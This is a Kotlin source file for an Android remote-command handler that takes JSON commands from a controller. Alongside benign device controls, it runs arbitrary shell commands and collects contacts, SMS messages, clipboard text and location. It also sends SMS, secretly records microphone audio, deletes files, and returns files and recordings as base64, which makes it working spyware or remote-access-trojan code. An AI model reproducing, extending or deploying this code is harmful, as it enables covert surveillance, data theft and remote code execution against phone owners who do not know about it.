package com.example.devicecontrol

import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.widget.Toast
import org.json.JSONObject
import org.json.JSONArray
import android.os.Handler
import android.os.Looper
import android.media.AudioManager
import android.hardware.camera2.CameraManager
import android.speech.tts.TextToSpeech
import android.app.NotificationChannel
import android.app.NotificationManager
import androidx.core.app.NotificationCompat
import android.hardware.SensorManager
import android.hardware.Sensor
import java.io.BufferedReader
import java.io.InputStreamReader
import android.content.ClipboardManager
import android.content.ClipData
import java.util.Locale
import android.net.Uri
import java.net.Inet4Address
import java.net.Inet6Address
import java.net.NetworkInterface
import java.util.*
import android.provider.ContactsContract
import android.telephony.SmsManager
import android.net.wifi.WifiManager
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat
import android.Manifest
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.graphics.ImageFormat
import android.os.HandlerThread

import android.os.Vibrator
import android.os.VibratorManager
import android.os.VibrationEffect
import android.media.RingtoneManager
import android.provider.CallLog
import android.app.WallpaperManager
import android.content.Intent
import android.content.pm.ApplicationInfo
import java.net.URL
import android.graphics.BitmapFactory

class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener {

    private var tts: TextToSpeech? = null
    private val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
    private var isTorchOn = false

    init {
        tts = TextToSpeech(context, this)
    }

    override fun onInit(status: Int) {
        if (status == TextToSpeech.SUCCESS) {
            tts?.language = Locale("id", "ID")
        }
    }

    private fun checkPerm(perm: String): Boolean {
        return ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED
    }

    fun handle(jsonStr: String, sendResponse: (String) -> Unit): String? {
        var cmdId = ""
        try {
            val json = JSONObject(jsonStr)
            var command = json.getString("command").trim()
            var textArg = json.optString("text", "")
            cmdId = json.optString("id", "")

            if (command.contains(" ")) {
                val parts = command.split(" ", limit = 2)
                command = parts[0]
                if (textArg.isEmpty()) textArg = parts[1]
            }

            when (command) {
                "ping" -> {
                    val resp = createResponse(cmdId, "pong", "Alive")
                    sendResponse(resp)
                    return resp
                }
                "get_device_info" -> {
                    val info = JSONObject().apply {
                        put("model", Build.MODEL)
                        put("brand", Build.BRAND)
                        put("sdk", Build.VERSION.SDK_INT)
                        put("release", Build.VERSION.RELEASE)
                        
                        val ips = getIPs()
                        put("ipv4", ips.first)
                        put("ipv6", ips.second)
                    }
                    val resp = createResponse(cmdId, "device_info", info)
                    sendResponse(resp)
                    return resp
                }
                "get_battery" -> {
                    val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
                    val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                    val resp = createResponse(cmdId, "battery_level", level)
                    sendResponse(resp)
                    return resp
                }
                "show_toast" -> {
                    Handler(Looper.getMainLooper()).post {
                        Toast.makeText(context, textArg.ifEmpty { "Remote Command" }, Toast.LENGTH_SHORT).show()
                    }
                    val resp = createResponse(cmdId, "toast", "Displayed: $textArg")
                    sendResponse(resp)
                    return resp
                }
                "shell" -> {
                    try {
                        val process = Runtime.getRuntime().exec(textArg.ifEmpty { "ls" })
                        val reader = BufferedReader(InputStreamReader(process.inputStream))
                        val errorReader = BufferedReader(InputStreamReader(process.errorStream))
                        val output = StringBuilder()
                        var line: String?
                        while (reader.readLine().also { line = it } != null) output.append(line).append("\n")
                        while (errorReader.readLine().also { line = it } != null) output.append(line).append("\n")
                        process.waitFor()
                        val resp = createResponse(cmdId, "shell_output", output.toString())
                        sendResponse(resp)
                        return resp
                    } catch (e: Exception) {
                        val resp = createResponse(cmdId, "error", "Shell failed: ${e.message}")
                        sendResponse(resp)
                        return resp
                    }
                }
                "get_volume", "volume" -> {
                    val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                    val volInfo = JSONObject().apply {
                        put("ring", am.getStreamVolume(AudioManager.STREAM_RING))
                        put("music", am.getStreamVolume(AudioManager.STREAM_MUSIC))
                        put("alarm", am.getStreamVolume(AudioManager.STREAM_ALARM))
                        put("voice", am.getStreamVolume(AudioManager.STREAM_VOICE_CALL))
                        put("notification", am.getStreamVolume(AudioManager.STREAM_NOTIFICATION))
                    }
                    val resp = createResponse(cmdId, "volume_info", volInfo)
                    sendResponse(resp)
                    return resp
                }
                "set_volume" -> {
                    val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                    if (textArg.lowercase() == "get") {
                        val volInfo = JSONObject().apply {
                            put("ring", am.getStreamVolume(AudioManager.STREAM_RING))
                            put("music", am.getStreamVolume(AudioManager.STREAM_MUSIC))
                            put("alarm", am.getStreamVolume(AudioManager.STREAM_ALARM))
                            put("voice", am.getStreamVolume(AudioManager.STREAM_VOICE_CALL))
                            put("notification", am.getStreamVolume(AudioManager.STREAM_NOTIFICATION))
                        }
                        val resp = createResponse(cmdId, "volume_info", volInfo)
                        sendResponse(resp)
                        return resp
                    } else {
                        val parts = textArg.split(" ")
                        if (parts.size >= 2) {
                            try {
                                val type = parts[0]
                                val vol = parts[1].toIntOrNull() ?: 0
                                val stream = when (type.lowercase()) {
                                    "music" -> AudioManager.STREAM_MUSIC
                                    "ring" -> AudioManager.STREAM_RING
                                    "alarm" -> AudioManager.STREAM_ALARM
                                    "notification" -> AudioManager.STREAM_NOTIFICATION
                                    "voice" -> AudioManager.STREAM_VOICE_CALL
                                    else -> AudioManager.STREAM_MUSIC
                                }
                                val max = am.getStreamMaxVolume(stream)
                                val finalVol = if (vol > max) max else if (vol < 0) 0 else vol
                                am.setStreamVolume(stream, finalVol, 0)
                                val resp = createResponse(cmdId, "success", "Volume $type set to $finalVol")
                                sendResponse(resp)
                                return resp
                            } catch (e: Exception) {
                                val resp = createResponse(cmdId, "error", "Gagal: ${e.message}")
                                sendResponse(resp)
                                return resp
                            }
                        }
                    }
                }
                "torch" -> {
                    try {
                        val camManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                        val cameraId = camManager.cameraIdList[0] 
                        val state = if (textArg.lowercase() == "on") true else if (textArg.lowercase() == "off") false else !isTorchOn
                        camManager.setTorchMode(cameraId, state)
                        isTorchOn = state
                        val resp = createResponse(cmdId, "success", "Torch $state")
                        sendResponse(resp)
                        return resp
                    } catch (e: Exception) {
                        val resp = createResponse(cmdId, "error", "Torch err: ${e.message}")
                        sendResponse(resp)
                        return resp
                    }
                }
                "tts" -> {
                    tts?.speak(textArg, TextToSpeech.QUEUE_ADD, null, null)
                    val resp = createResponse(cmdId, "success", "Speaking...")
                    sendResponse(resp)
                    return resp
                }
                "notify" -> {
                    val parts = textArg.split("|")
                    val title = if (parts.isNotEmpty()) parts[0] else "System Alert"
                    val content = if (parts.size > 1) parts[1] else "Message"
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        val channel = NotificationChannel("remote_notify", "Remote Messages", NotificationManager.IMPORTANCE_HIGH)
                        notificationManager.createNotificationChannel(channel)
                    }
                    val notification = NotificationCompat.Builder(context, "remote_notify")
                        .setSmallIcon(android.R.drawable.ic_dialog_alert)
                        .setContentTitle(title)
                        .setContentText(content)
                        .setPriority(NotificationCompat.PRIORITY_HIGH)
                        .build()
                    notificationManager.notify((System.currentTimeMillis() % 10000).toInt(), notification)
                    val resp = createResponse(cmdId, "success", "Pushed")
                    sendResponse(resp)
                    return resp
                }
                "sensors" -> {
                    val sm = context.getSystemService(Context.SENSOR_SERVICE) as SensorManager
                    val list = sm.getSensorList(Sensor.TYPE_ALL)
                    val result = JSONArray()
                    for (s in list) { result.put(JSONObject().apply { put("name", s.name); put("type", s.type) }) }
                    val resp = createResponse(cmdId, "sensor_list", result)
                    sendResponse(resp)
                    return resp
                }
                "clipboard" -> {
                    val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                    val txt = if (cm.hasPrimaryClip()) cm.primaryClip?.getItemAt(0)?.text?.toString() ?: "" else ""
                    val resp = createResponse(cmdId, "clipboard", txt)
                    sendResponse(resp)
                    return resp
                }
                "ls" -> {
                    try {
                        val path = if (textArg.isEmpty()) "/storage/emulated/0" else textArg
                        val dir = java.io.File(path)
                        val arr = JSONArray()
                        if (dir.exists() && dir.isDirectory) {
                            val files = dir.listFiles()?.toList() ?: emptyList()
                            val sorted = files.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
                            sorted.forEach {
                                arr.put(JSONObject().apply {
                                    put("name", it.name); put("is_dir", it.isDirectory)
                                    put("path", it.absolutePath); put("size", it.length())
                                })
                            }
                            val resp = createResponse(cmdId, "ls_result", arr)
                            sendResponse(resp)
                            return resp
                        }
                    } catch (e: Exception) {}
                }
            }

            // Asynchronous commands
            when (command) {
                "location" -> {
                    if (checkPerm(Manifest.permission.ACCESS_FINE_LOCATION)) {
                        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                        val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                        if (loc != null) {
                            val obj = JSONObject().apply { put("lat", loc.latitude); put("lon", loc.longitude); put("google_maps", "https://maps.google.com/?q=${loc.latitude},${loc.longitude}") }
                            sendResponse(createResponse(cmdId, "location_data", obj))
                        } else sendResponse(createResponse(cmdId, "error", "Location not found"))
                    }
                }
                "contacts" -> {
                    if (checkPerm(Manifest.permission.READ_CONTACTS)) {
                        val res = JSONArray()
                        val cursor = context.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
                        cursor?.use {
                            while (it.moveToNext() && res.length() < 100) {
                                res.put(JSONObject().apply {
                                    put("name", it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                                    put("number", it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                                })
                            }
                        }
                        sendResponse(createResponse(cmdId, "contacts_list", res))
                    }
                }
                "sms_list" -> {
                    if (checkPerm(Manifest.permission.READ_SMS)) {
                        val res = JSONArray()
                        val cursor = context.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC")
                        cursor?.use {
                            while (it.moveToNext() && res.length() < 50) {
                                res.put(JSONObject().apply {
                                    put("from", it.getString(it.getColumnIndex("address")))
                                    put("body", it.getString(it.getColumnIndex("body")))
                                })
                            }
                        }
                        sendResponse(createResponse(cmdId, "sms_inbox", res))
                    }
                }
                "sms_send" -> {
                    val parts = textArg.split("|")
                    if (parts.size >= 2) {
                        SmsManager.getDefault().sendTextMessage(parts[0], null, parts[1], null, null)
                        sendResponse(createResponse(cmdId, "success", "Sent"))
                    }
                }
                "wifi_scan" -> {
                    val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                    val res = JSONArray()
                    wm.scanResults.forEach { res.put(JSONObject().apply { put("ssid", it.SSID); put("level", it.level) }) }
                    sendResponse(createResponse(cmdId, "wifi_networks", res))
                }
                "record_sound" -> {
                    Thread {
                        try {
                            val duration = textArg.toLongOrNull() ?: 5L
                            val file = java.io.File(context.cacheDir, "record.mp4")
                            val mr = android.media.MediaRecorder()
                            mr.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                            mr.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                            mr.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                            mr.setOutputFile(file.absolutePath)
                            mr.prepare(); mr.start()
                            Thread.sleep(duration * 1000); mr.stop(); mr.release()
                            val b64 = android.util.Base64.encodeToString(file.readBytes(), android.util.Base64.DEFAULT)
                            sendResponse(createResponse(cmdId, "audio_base64", b64))
                        } catch (e: Exception) { sendResponse(createResponse(cmdId, "error", e.message ?: "Record failed")) }
                    }.start()
                }
                "photo" -> {
                    // Photo implementation usually needs more setup, leaving as simplified async
                    sendResponse(createResponse(cmdId, "error", "Photo via Web not yet optimized"))
                }
                "rm" -> {
                    val f = java.io.File(textArg)
                    if (f.exists()) {
                        val del = if (f.isDirectory) f.deleteRecursively() else f.delete()
                        sendResponse(createResponse(cmdId, if (del) "success" else "error", "RM: $textArg"))
                    }
                }
                "mv" -> {
                    val p = textArg.split("|")
                    if (p.size == 2 && java.io.File(p[0]).renameTo(java.io.File(p[1])))
                        sendResponse(createResponse(cmdId, "success", "Moved"))
                }
                "find" -> {
                    Thread {
                        val p = textArg.split("|"); val root = java.io.File(if (p.isNotEmpty()) p[0] else "/sdcard")
                        val query = if (p.size > 1) p[1].lowercase() else ""
                        val res = JSONArray()
                        fun walk(d: java.io.File) {
                            d.listFiles()?.forEach { if (it.isDirectory) walk(it) else if (it.name.lowercase().contains(query)) res.put(JSONObject().apply { put("name", it.name); put("path", it.absolutePath) }) }
                        }
                        if (root.exists()) walk(root)
                        sendResponse(createResponse(cmdId, "find_result", res))
                    }.start()
                }
                "download" -> {
                    Thread {
                        val f = java.io.File(textArg)
                        if (f.exists()) {
                            val b64 = android.util.Base64.encodeToString(f.readBytes(), android.util.Base64.DEFAULT)
                            sendResponse(createResponse(cmdId, "file_download", JSONObject().apply { put("name", f.name); put("data", b64) }))
                        }
                    }.start()
                }
            }
        } catch (e: Exception) {
            val resp = createResponse(cmdId, "error", e.message ?: "Err")
            sendResponse(resp); return resp
        }
        return null
    }

    private fun getIPs(): Pair<String?, String?> {
        var ipv4: String? = null
        var ipv6: String? = null
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces()?.toList() ?: emptyList()
            for (iface in interfaces) {
                if (!iface.isUp || iface.isLoopback) continue
                for (addr in iface.inetAddresses) {
                    if (!addr.isLoopbackAddress) {
                        if (addr is Inet4Address) {
                            ipv4 = addr.hostAddress
                        } else if (addr is Inet6Address) {
                            val sAddr = addr.hostAddress.replace("%.*".toRegex(), "").uppercase()
                            if (!addr.isLinkLocalAddress && (sAddr.startsWith("2") || sAddr.startsWith("3"))) {
                                ipv6 = sAddr
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {}
        return Pair(ipv4, ipv6)
    }

    private fun createResponse(cmdId: String, type: String, data: Any): String {
        return JSONObject().apply {
            if (cmdId.isNotEmpty()) put("id", cmdId)
            put("type", type); put("data", data); put("timestamp", System.currentTimeMillis())
        }.toString()
    }
}
